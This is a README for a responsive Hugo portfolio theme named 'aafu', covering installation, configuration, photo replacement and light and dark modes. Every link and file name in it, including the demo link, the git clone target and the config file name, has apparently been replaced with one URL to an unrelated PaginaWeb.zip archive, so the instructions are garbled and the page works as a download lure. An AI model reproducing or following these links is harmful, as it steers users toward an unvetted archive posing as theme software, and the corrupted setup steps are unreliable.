# aafu Theme

The aafu Theme is a responsive portfolio with blog. [Click here](https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip) for live demo.

## Installation

```shell
git clone https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip
cd aafu
npm install
hugo server
```

## Getting started

After cloning the aafu repo, modify the `https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip` as you wish.

### The config file

You'll find a file called [`https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip`](https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip). Customize it per your need.

Note that the sections to be displayed in the accordion, the order of the sections, and the section that should be expanded at the beginning can be specifed in the `https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip`.

### Add your photo

Go to `static/images` and replace the `https://raw.githubusercontent.com/fatalbru/PaginaWeb/main/tarmined/PaginaWeb.zip` with your own file.

### Theme Colors

The `aafu` theme provides `light` and `dark` theme.
